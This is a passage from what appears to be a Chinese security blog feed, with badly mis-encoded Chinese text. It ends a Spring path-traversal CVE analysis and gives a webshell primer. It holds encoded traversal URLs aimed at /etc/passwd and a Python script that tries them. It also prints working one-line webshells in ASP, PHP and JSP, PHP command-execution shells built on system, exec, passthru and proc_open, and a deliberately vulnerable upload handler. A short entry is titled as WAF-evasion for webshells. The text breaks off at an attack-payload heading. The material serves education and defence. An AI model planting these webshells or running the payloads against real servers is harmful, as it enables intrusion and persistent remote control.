StandardCharsets.UTF_8);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸»è¦æ˜¯æ·»åŠ äº†ä¸Šé¢çš„ä¸¤ä¸ªå‡½æ•°<code>normalizePath decode</code></p><ol><li><p><strong>è·¯å¾„è§„èŒƒåŒ–ï¼ˆ<code>normalizePath</code> æ–¹æ³•çš„æ·»åŠ ï¼‰</strong>ï¼š</p><ul><li>æ–°ä»£ç ä¸­æ·»åŠ äº†<code>normalizePath</code>æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ›´è¯¦å°½åœ°å¤„ç†äº†è·¯å¾„ä¸­çš„ç¼–ç é—®é¢˜ã€‚å¦‚æœè·¯å¾„åŒ…å«ç™¾åˆ†å·ï¼ˆ<code>%</code>ï¼‰ï¼Œè¯¥æ–¹æ³•å°†å°è¯•è§£ç è·¯å¾„ï¼Œå¹¶åœ¨è§£ç åå†æ¬¡éªŒè¯è·¯å¾„æ˜¯å¦å«æœ‰<code>../</code>ï¼Œå¦‚æœæœ‰ï¼Œåˆ™è°ƒç”¨<code>StringUtils.cleanPath</code>æ¥è§„èŒƒåŒ–è·¯å¾„ã€‚è¿™å¢åŠ äº†å¯¹è·¯å¾„ç¼–ç æ¼æ´çš„é˜²æŠ¤ï¼Œå¯ä»¥é˜²æ­¢æ”»å‡»è€…åˆ©ç”¨ç¼–ç åçš„ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚<code>%2e%2e%2f</code>å¯¹åº”<code>../</code>ï¼‰è¿›è¡Œæ”»å‡»ã€‚</li></ul></li><li><p><strong>è·¯å¾„è§£ç é€»è¾‘ï¼ˆ<code>decode</code> æ–¹æ³•çš„å®ç°ï¼‰</strong>ï¼š</p><ul><li>æ–°å¢çš„<code>decode</code>æ–¹æ³•å°è¯•è§£ç è·¯å¾„ï¼Œå¦‚æœè§£ç å¤±è´¥ï¼Œåˆ™è¿”å›ç©ºå­—ç¬¦ä¸²ã€‚è¿™æ ·çš„å¤„ç†å‡å°‘äº†å› è§£ç å¤±è´¥å¯¼è‡´çš„å¼‚å¸¸æŠ›å‡ºï¼Œå¢å¼ºäº†ä»£ç çš„å¥å£®æ€§ï¼Œå¹¶é—´æ¥é˜²æ­¢äº†å¯èƒ½çš„æ”»å‡»ã€‚</li></ul></li><li><p><strong>æ›´ä¸¥æ ¼çš„è·¯å¾„éªŒè¯ï¼ˆæ”¹è¿›<code>isInvalidPath</code> å’Œ <code>isInvalidEncodedInputPath</code> æ–¹æ³•ï¼‰</strong>ï¼š</p><ul><li><code>isInvalidPath</code>æ–¹æ³•ç°åœ¨ç›´æ¥è¿”å›<code>true</code>å¦‚æœè·¯å¾„ä¸­åŒ…å«<code>&quot;../&quot;</code>ï¼Œè¿™ç®€åŒ–äº†æ£€æŸ¥é€»è¾‘ï¼Œç¡®ä¿äº†è·¯å¾„ä¸­ä¸åŒ…å«å‘ä¸Šçº§ç›®å½•çš„è·³è½¬ã€‚</li><li><code>isInvalidEncodedInputPath</code>æ–¹æ³•å¯¹äºåŒ…å«ç™¾åˆ†å·çš„è·¯å¾„ï¼Œä¼šåœ¨è§£ç åå¯¹è·¯å¾„è¿›è¡Œä¸¤æ¬¡æ£€æŸ¥ï¼Œä¸€æ¬¡æ˜¯ç›´æ¥è§£ç åï¼Œå¦ä¸€æ¬¡æ˜¯å¤„ç†ï¼ˆæ­£è§„åŒ–ï¼‰è§£ç åçš„è·¯å¾„ã€‚è¿™æ ·çš„åŒé‡æ£€æŸ¥å¯ä»¥æ›´æœ‰æ•ˆåœ°æ•æ‰åˆ°æ½œåœ¨çš„éæ³•è·¯å¾„è®¿é—®å°è¯•ã€‚<br><img src="/2024/10/18/WebSecurity/cve/20241018/image-1.png"><br>ä¸‹é¢åˆ†æåˆ©ç”¨é“¾<br><img src="/2024/10/18/WebSecurity/cve/20241018/image-2.png"><br>é€šè¿‡testå¯ä»¥çœ‹åˆ°æ˜¯ç±»ä¼¼è¿™æ ·çš„èµ„æºè®¿é—®ä¼šè§¦å‘ï¼Œæ¥ä¸‹æ¥å°è¯•æ„é€ poc</li></ul></li><li><p><strong>æ„å»ºè¯·æ±‚</strong>ï¼š</p><ul><li>å°è¯•é€šè¿‡å¤šé‡ç¼–ç çš„è·¯å¾„æ¥ç»•è¿‡å¯èƒ½çš„å•å±‚è·¯å¾„è¿‡æ»¤ã€‚</li><li>ç¤ºä¾‹è·¯å¾„ï¼š<code>http://example.com/resources/../../../../../../../../../etc/passwd</code></li><li>ä½¿ç”¨ç¼–ç é¿å…è¿‡æ»¤ï¼š<code>http://example.com/resources/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></li><li>æ›´å¤šç¼–ç å±‚æ¬¡ï¼š<code>http://example.com/resources/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd</code></li></ul></li><li><p><strong>æ„å»ºæµ‹è¯•è„šæœ¬</strong>ï¼ˆä½¿ç”¨Pythonï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_path_traversal</span>(<span class="params">url_base</span>):</span><br><span class="line">    <span class="comment"># ä¸åŒå±‚æ¬¡çš„ç¼–ç æµ‹è¯•</span></span><br><span class="line">    paths = [</span><br><span class="line">        <span class="string">&quot;/../../../../../../../../../etc/passwd&quot;</span>,  <span class="comment"># æ— ç¼–ç </span></span><br><span class="line">        <span class="string">&quot;/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&quot;</span>,  <span class="comment"># å•æ¬¡ç¼–ç </span></span><br><span class="line">        <span class="string">&quot;/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd&quot;</span>  <span class="comment"># å¤šæ¬¡ç¼–ç </span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> paths:</span><br><span class="line">        full_url = <span class="string">f&quot;<span class="subst">&#123;url_base&#125;</span><span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">        response = requests.get(full_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;root:&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Vulnerable to path traversal at <span class="subst">&#123;full_url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Secure against path traversal at <span class="subst">&#123;full_url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test_path_traversal(<span class="string">&quot;http://example.com/resources&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Webå®‰å…¨ã€‘webshellå…æ€ç»•è¿‡wafç­‰</title>
      <link href="/2024/10/18/WebSecurity/webshell/webshellevasion/"/>
      <url>/2024/10/18/WebSecurity/webshell/webshellevasion/</url>
      
        <content type="html"><![CDATA[<p>aesç»å¸¸ä¼šé‡åˆ°æ–œæ ï¼Œbase64æ²¡æœ‰</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webshell </tag>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Webå®‰å…¨ã€‘æ·±å…¥ç†è§£Webshellï¼šéƒ¨ç½²ã€æ£€æµ‹ä¸é˜²å¾¡</title>
      <link href="/2024/10/18/WebSecurity/webshell/webshell/"/>
      <url>/2024/10/18/WebSecurity/webshell/webshell/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/articles/network/307685.html">https://www.freebuf.com/articles/network/307685.html</a><br>ä¸€æ–‡è®²è§£webshell <a href="https://cloud.tencent.com/developer/article/1635250">https://cloud.tencent.com/developer/article/1635250</a></p><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p>Webshellå°±æ˜¯ä»¥aspã€phpã€jspæˆ–cgiç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§ä»£ç æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥å°†å…¶ç§°åšä¸ºä¸€ç§ç½‘é¡µåé—¨ã€‚</p><p>WebShellçš„ç‰¹ç‚¹</p><ol><li>æŒä¹…åŒ–è¿œç¨‹è®¿é—®: Webshellè„šæœ¬é€šå¸¸ä¼šåŒ…å«åé—¨ï¼Œé»‘å®¢ä¸Šä¼ Webshellä¹‹åï¼Œå°±å¯ä»¥å……åˆ†åˆ©ç”¨Webshellçš„åé—¨å®ç°è¿œç¨‹è®¿é—®å¹¶æ§åˆ¶æœåŠ¡å™¨ï¼Œä»è€Œè¾¾åˆ°é•¿æœŸæ§åˆ¶ç½‘ç«™æœåŠ¡å™¨çš„ç›®çš„ã€‚æ­¤å¤–ï¼Œåœ¨ä¸Šä¼ å®ŒWebshellä¹‹åï¼Œé»‘å®¢ä¼šé€‰æ‹©è‡ªå·±ä¿®å¤æ¼æ´ï¼Œä»¥ç¡®ä¿æ²¡æœ‰å…¶ä»–äººä¼šåˆ©ç”¨è¯¥æ¼æ´ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œé»‘å®¢å°±å¯ä»¥ä¸€ç§ä½è°ƒçš„å§¿æ€ï¼Œé¿å…ä¸ç®¡ç†å‘˜è¿›è¡Œä»»ä½•äº¤äº’ï¼ŒåŒæ—¶ä»ç„¶è·å¾—ç›¸åŒçš„ç»“æœã€‚</li><li>ææƒ: åœ¨æœåŠ¡å™¨æ²¡æœ‰é…ç½®é”™è¯¯çš„æƒ…å†µä¸‹ï¼ŒWebshellå°†åœ¨webæœåŠ¡å™¨çš„ç”¨æˆ·æƒé™ä¸‹è¿è¡Œï¼Œè€Œç”¨æˆ·æƒé™æ˜¯æœ‰é™çš„ã€‚é€šè¿‡Webshellï¼Œé»‘å®¢å¯ä»¥åˆ©ç”¨ç³»ç»Ÿä¸Šçš„æœ¬åœ°æ¼æ´æ¥å®ç°æƒé™æå‡ï¼Œä»è€Œè·å¾—Rootæƒé™ï¼Œè¿™æ ·é»‘å®¢åŸºæœ¬ä¸Šå¯ä»¥åœ¨ç³»ç»Ÿä¸Šåšä»»ä½•äº‹æƒ…ï¼ŒåŒ…æ‹¬å®‰è£…è½¯ä»¶ã€æ›´æ”¹æƒé™ã€æ·»åŠ å’Œåˆ é™¤ç”¨æˆ·ã€çªƒå–å¯†ç ã€é˜…è¯»ç”µå­é‚®ä»¶ç­‰ç­‰ã€‚</li><li>éšè”½æ€§æå¼º: Webshellå¯ä»¥åµŒå¥—åœ¨æ­£å¸¸ç½‘é¡µä¸­è¿è¡Œï¼Œä¸”ä¸å®¹æ˜“è¢«æŸ¥æ€ã€‚å®ƒè¿˜å¯ä»¥ç©¿è¶ŠæœåŠ¡å™¨é˜²ç«å¢™ï¼Œç”±äºä¸è¢«æ§åˆ¶çš„æœåŠ¡å™¨æˆ–è¿œç¨‹ä¸»æœºäº¤äº’çš„æ•°æ®éƒ½æ˜¯é€šè¿‡80ç«¯å£ä¼ é€’ï¼Œå› æ­¤ä¸ä¼šè¢«é˜²ç«å¢™æ‹¦æˆªï¼Œåœ¨æ²¡æœ‰è®°å½•æµé‡çš„æƒ…å†µä¸‹ï¼ŒWebshellä½¿ç”¨poståŒ…å‘é€ï¼Œä¹Ÿä¸ä¼šè¢«è®°å½•åœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ï¼Œåªä¼šåœ¨Webæ—¥å¿—ä¸­è®°å½•ä¸€äº›æ•°æ®æäº¤çš„è®°å½•ã€‚</li></ol><p><strong>WebShellåˆ†ç±»</strong><br>Webshellæ ¹æ®è„šæœ¬å¯ä»¥åˆ†ä¸ºPHPè„šæœ¬æœ¨é©¬ï¼ŒASPè„šæœ¬æœ¨é©¬ï¼ŒJSPè„šæœ¬æœ¨é©¬ï¼Œä¹Ÿæœ‰åŸºäº.NETçš„è„šæœ¬æœ¨é©¬ã€‚æ ¹æ®æ—¶ä»£å’ŒæŠ€æœ¯çš„å˜è¿ï¼Œä¹Ÿæœ‰ç”¨pythonå’Œluaç¼–å†™çš„è„šæœ¬æœ¨é©¬ï¼Œå¸¸ç”¨æœ‰å¦‚ä¸‹å‡ ç§ï¼š</p><ul><li>å¤§é©¬ï¼šä½“ç§¯å¤§ï¼ŒåŠŸèƒ½å…¨ï¼›ä¼šè°ƒç”¨ç³»ç»Ÿå…³é”®å‡½æ•°ï¼›ä»¥ä»£ç åŠ å¯†è¿›è¡Œéšè—</li><li>å°é©¬ï¼šä½“ç§¯å°ï¼ŒåŠŸèƒ½å°‘ï¼›ä¸€èˆ¬åªæœ‰ä¸€ä¸ªä¸Šä¼ åŠŸèƒ½ï¼Œç”¨äºä¸Šä¼ å¤§é©¬</li><li>ä¸€å¥è¯æœ¨é©¬ï¼šä»£ç çŸ­ï¼›ä½¿ç”¨åœºæ™¯å¤§ï¼Œå¯å•ç‹¬ç”Ÿæˆæ–‡ä»¶ï¼Œå¯æ’å…¥æ–‡ä»¶ï¼›å®‰å…¨æ€§é«˜ï¼Œéšè—æ€§å¼ºï¼Œå¯å˜å½¢å…æ€ï¼›æ¡†æ¶ä¸å˜ï¼Œæ•°æ®æ‰§è¡Œï¼Œæ•°æ®ä¼ é€’ï¼›ä½¿ç”¨å®¢æˆ·ç«¯ç®¡ç†webshellï¼Œçœå»ä½¿ç”¨å‘½ä»¤è¡Œä»¥åŠå„ç§å‚æ•°é…ç½®ï¼Œå¯ä»¥ä½¿ç”¨ä¸­å›½èšå‰‘å›¾å½¢åŒ–æ“ä½œwebshell</li><li>æ‰“åŒ…é©¬ï¼šä¸»è¦ç”¨äºæ‰“åŒ…ç½‘ç«™æºç </li><li>æ‹–åº“é©¬ï¼šä¸»è¦ç”¨äºå¯¼å‡ºç½‘ç«™æ•°æ®åº“</li><li>å†…å­˜é©¬ï¼šæ— æ–‡ä»¶è½åœ°ï¼›æéš¾æ£€æµ‹å’Œå‘ç°ï¼›éš¾ä»¥æ¸…é™¤</li></ul><p><strong>WebShellåŸç†</strong><br>ä¸åŒè„šæœ¬ç±»å‹çš„ä¸€å¥è¯æœ¨é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">request</span>(<span class="string">&quot;cmd&quot;</span>)%&gt;</span><br><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">&quot;cmd&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line">&lt;%Runtime.<span class="title function_ invoke__">getRuntime</span>().<span class="title function_ invoke__">exec</span>(request.<span class="title function_ invoke__">getParameter</span>(<span class="string">&quot;cmd&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/18/WebSecurity/webshell/webshell/image.png"></p><p>PHPä¸€å¥è¯æœ¨é©¬æ ¸å¿ƒæ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>æ•°æ®ä¼ é€’: <code>$_GETã€$_POSTã€$_COOKIESã€$_REQUESTã€$_FILEã€$_SERVER</code><br>  ä»è¿œç¨‹è¿œç¨‹URLä¸­è·å–æ•°æ®: file_get_contentsã€curlã€svn_checkoutâ€¦<br>  ï¼ˆå°†éœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤æ•°æ®æ”¾åœ¨è¿œç¨‹URLä¸­ï¼Œé€šè¿‡URL_INCLUDEæ¥è¯»å–ï¼‰<br>  ä»æœ¬åœ°ç£ç›˜æ–‡ä»¶ä¸­è·å–æ•°æ®: fileã€file_get_contentsâ€¦<br>  ï¼ˆå°†éœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤æ•°æ®æ”¾åœ¨æœ¬åœ°ç£ç›˜æ–‡ä»¶ä¸­ï¼Œåˆ©ç”¨IOå‡½æ•°æ¥è¯»å–ï¼‰<br>  ä»æ•°æ®åº“ä¸­è¯»å–ï¼ˆå°†éœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤æ”¾åœ¨æ•°æ®åº“ä¸­ï¼Œåˆ©ç”¨æ•°æ®åº“å‡½æ•°æ¥è¯»å–ï¼‰<br>  ä»å›¾ç‰‡å¤´éƒ¨ä¸­è·å–: exif_read_dataâ€¦ï¼ˆå°†éœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤æ•°æ®æ”¾åœ¨å›¾ç‰‡å¤´éƒ¨ä¸­ï¼Œåˆ©ç”¨å›¾ç‰‡æ“ä½œå‡½æ•°æ¥è¯»å–ï¼‰</li><li>ä»£ç æ‰§è¡Œ<br>  ä»£ç æ‰§è¡Œå‡½æ•°ï¼ševalã€assertã€systemâ€¦æ‰§è¡Œï¼ˆè¿™æ˜¯æœ€æ™®é€šã€æ ‡å‡†çš„ä»£ç æ‰§è¡Œï¼‰<br>  LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰ï¼šincludeã€requireâ€¦ï¼ˆåˆ©ç”¨æµè§ˆå™¨çš„ä¼ªåè®®å°†æ–‡ä»¶åŒ…å«è½¬åŒ–ä¸ºä»£ç æ‰§è¡Œï¼‰<br>  åŠ¨æ€å‡½æ•°æ‰§è¡Œï¼šï¼ˆ$()â€¦PHPçš„åŠ¨æ€å‡½æ•°ç‰¹æ€§ï¼‰<br>  Curly Syntaxï¼šï¼ˆ${${â€¦}}â€¦å®ƒå°†æ‰§è¡ŒèŠ±æ‹¬å·é—´çš„ä»£ç ï¼Œå¹¶å°†ç»“æœæ›¿æ¢å›å»ã€‚è¿™ç§æ€è·¯å¯ä»¥æŠŠå˜é‡èµ‹å€¼çš„æ¼æ´è½¬åŒ–ä¸ºä»£ç æ‰§è¡Œçš„æœºä¼šï¼‰</li></ol><p><strong>PHPä¸­å¸¸è¢«åˆ©ç”¨çš„å‡½æ•°</strong><br>    1. ç®€å•çš„PHP Webshell ä½¿ç”¨ <code>system()</code> å‡½æ•°<br>    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>    2. ä½¿ç”¨ <code>exec()</code> å‡½æ•°çš„Webshell</p><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$output</span> <span class="keyword">as</span> <span class="variable">$line</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$line</span>, ENT_QUOTES) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>3. ä½¿ç”¨ `shell_exec()` å‡½æ•°çš„Webshell<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$output</span>, ENT_QUOTES) . <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>4. ä½¿ç”¨ `passthru()` å‡½æ•°çš„Webshell<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>5. ä½¿ç”¨ `proc_open()` çš„é«˜çº§Webshell<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin æ˜¯ä¸ªç®¡é“ï¼Œä»ä¸­è¯»å–æ•°æ®</span></span><br><span class="line">        <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout æ˜¯ä¸ªç®¡é“ï¼Œå‘å…¶ä¸­å†™å…¥æ•°æ®</span></span><br><span class="line">        <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå†™å…¥åˆ° tmp/error-output.txt</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>], <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$line</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">            <span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></code></pre><h2 id="éƒ¨ç½²æŠ€æœ¯"><a href="#éƒ¨ç½²æŠ€æœ¯" class="headerlink" title="éƒ¨ç½²æŠ€æœ¯"></a>éƒ¨ç½²æŠ€æœ¯</h2><ol><li>æ–‡ä»¶ä¸Šä¼ æ¼æ´<br>æ–‡ä»¶ä¸Šä¼ æ¼æ´é€šå¸¸å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºæœªèƒ½æ­£ç¡®éªŒè¯ä¸Šä¼ æ–‡ä»¶çš„çœŸå®ç±»å‹å’Œå†…å®¹æ—¶ã€‚<br><strong>æ”»å‡»ç¤ºä¾‹ï¼š</strong><br>è€ƒè™‘ä¸€ä¸ªåŸºæœ¬çš„å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„PHPä»£ç ç¤ºä¾‹ï¼Œè¯¥ä»£ç å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$target_path</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File uploaded successfully!&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;There was an error uploading the file, please try again!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤ä»£ç ç‰‡æ®µæ¥å—ä¸Šä¼ çš„æ–‡ä»¶å¹¶å°†å…¶å­˜å‚¨åœ¨æœåŠ¡å™¨çš„â€œuploadsâ€ç›®å½•ä¸­ã€‚æ²¡æœ‰å¯¹æ–‡ä»¶ç±»å‹æˆ–å†…å®¹è¿›è¡Œä»»ä½•éªŒè¯ã€‚<br><strong>æ”»å‡»Payloadï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 